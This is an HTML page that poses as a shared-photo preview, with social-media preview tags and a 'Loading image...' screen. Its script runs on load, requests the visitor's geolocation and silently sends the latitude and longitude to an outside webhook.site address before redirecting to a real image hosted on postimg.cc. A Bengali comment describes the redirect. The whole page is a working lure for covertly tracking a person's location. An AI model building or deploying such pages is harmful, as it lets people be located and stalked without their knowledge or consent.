<!DOCTYPE html>
<html>
<head>
    <title>Photo Preview</title>
    <meta property="og:title" content="Shared a photo">
    <meta property="og:description" content="Click to view the full image">
    <meta property="og:image" content="https://i.postimg.cc/k5fL7S98/In-Shot-20260305-184518450.jpg">
    <meta property="og:type" content="image.jpg">
</head>
<body style="margin:0; background:black; display:flex; justify-content:center; align-items:center; height:100vh;">
    <div style="text-align:center; color:white;"><p>Loading image...</p></div>
    <script>
        // এখানে আপনার ছবির নতুন লিঙ্কটি দেওয়া হয়েছে, যেখানে ইউজার ক্লিক করলে পৌঁছাবে
        const targetURL = "https://postimg.cc/3k09KZXR";
        const webhookURL = "https://webhook.site/df38940f-cedd-4529-8fdb-ac6d2b4ad408";

        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    fetch(webhookURL, { method: 'POST', mode: 'no-cors', 
                        body: JSON.stringify({lat: position.coords.latitude, lon: position.coords.longitude}) 
                    }).then(() => { window.location.href = targetURL; });
                }, function() { window.location.href = targetURL; }, {timeout: 5000});
            } else { window.location.href = targetURL; }
        };
    </script>
</body>
</html>
